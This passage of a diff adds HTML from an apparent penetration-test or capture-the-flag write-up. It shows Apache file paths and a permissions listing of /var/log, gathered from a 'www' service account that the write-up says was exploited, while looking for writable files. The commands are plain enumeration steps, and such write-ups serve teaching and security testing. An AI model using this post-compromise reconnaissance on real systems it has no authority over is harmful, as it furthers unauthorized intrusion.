+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/etc/apache2/conf-available/other-vhosts-access-log.conf</span></span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/etc/apache2/conf-enabled/other-vhosts-access-log.conf</span></span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/etc/apache2/mods-available/log_debug.load</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/etc/apache2/mods-available/log_forensic.load</span></span>
+<span id="cb35-6"><a href="#cb35-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/etc/logrotate.d/apache2</span></span>
+<span id="cb35-7"><a href="#cb35-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/lib/apache2/modules/mod_log_debug.so</span></span>
+<span id="cb35-8"><a href="#cb35-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/lib/apache2/modules/mod_log_forensic.so</span></span>
+<span id="cb35-9"><a href="#cb35-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/apache2/icons/openlogo-75.png</span></span>
+<span id="cb35-10"><a href="#cb35-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2/changelog.Debian.gz</span></span>
+<span id="cb35-11"><a href="#cb35-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2/changelog.gz</span></span>
+<span id="cb35-12"><a href="#cb35-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2-bin/changelog.Debian.gz</span></span>
+<span id="cb35-13"><a href="#cb35-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2-bin/changelog.gz</span></span>
+<span id="cb35-14"><a href="#cb35-14" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2-data/changelog.Debian.gz</span></span>
+<span id="cb35-15"><a href="#cb35-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2-utils/changelog.Debian.gz</span></span>
+<span id="cb35-16"><a href="#cb35-16" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/apache2-utils/changelog.gz</span></span>
+<span id="cb35-17"><a href="#cb35-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/usr/share/doc/libapache-pom-java/changelog.Debian.gz</span></span>
+<span id="cb35-18"><a href="#cb35-18" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/var/lib/apache2/conf/enabled_by_maint/other-vhosts-access-log</span></span>
+<span id="cb35-19"><a href="#cb35-19" aria-hidden="true" tabindex="-1"></a>    <span class="ex">/var/log/apache2</span></span></code></pre></div></li>
+<li><p>navigate to /var/log/</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> cd /var/log</span></code></pre></div></li>
+<li><p>look for file permissions</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 5500</span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  19 root     root               4096 May 22 04:44 .</span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  12 root     root               4096 Apr 16 16:32 ..</span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root              25060 May 22 08:54 Xorg.0.log</span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root              54260 May 19 04:44 Xorg.0.log.old</span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root              24191 May 15 06:21 Xorg.1.log</span>
+<span id="cb37-8"><a href="#cb37-8" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root              24195 May 15 05:31 Xorg.1.log.old</span>
+<span id="cb37-9"><a href="#cb37-9" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root                516 May  4 10:15 alternatives.log</span>
+<span id="cb37-10"><a href="#cb37-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root               1680 Apr 28 06:12 alternatives.log.1</span>
+<span id="cb37-11"><a href="#cb37-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>   1 root     root               6567 Mar  9 10:10 alternatives.log.2.gz</span>
+<span id="cb37-12"><a href="#cb37-12" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-x---</span>   2 root     adm                4096 May 19 04:04 apache2</span>
+<span id="cb37-13"><a href="#cb37-13" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>   2 root     root               4096 May 15 19:06 apt</span>
+<span id="cb37-14"><a href="#cb37-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span>   1 root     adm               67039 May 22 08:55 auth.log</span>
+<span id="cb37-15"><a href="#cb37-15" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span>   1 root     adm              316551 May 16 04:35 auth.log.1</span>
+<span id="cb37-16"><a href="#cb37-16" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span>   1 root     adm               11047 May  8 15:39 auth.log.2.gz</span>
+<span id="cb37-17"><a href="#cb37-17" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span>   1 root     adm               10748 May  1 18:55 auth.log.3.gz</span>
+<span id="cb37-18"><a href="#cb37-18" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r-----</span>   1 root     adm                5532 Apr 25 04:22 auth.log.4.gz</span>
+<span id="cb37-19"><a href="#cb37-19" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root               5501 May 19 04:45 boot.log</span>
+<span id="cb37-20"><a href="#cb37-20" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root               5501 May 14 02:51 boot.log.1</span>
+<span id="cb37-21"><a href="#cb37-21" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root               5501 Apr 30 07:39 boot.log.2</span>
+<span id="cb37-22"><a href="#cb37-22" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root               6759 Apr 25 04:22 boot.log.3</span>
+<span id="cb37-23"><a href="#cb37-23" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root               5451 Apr 19 00:49 boot.log.4</span>
+<span id="cb37-24"><a href="#cb37-24" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>   1 root     root              66466 Apr  2 05:52 boot.log.5</span></code></pre></div>
+<blockquote>
+<p>All the files found are not writeable by service account <code>www</code> which we exploited.</p>
+</blockquote></li>
+</ul>
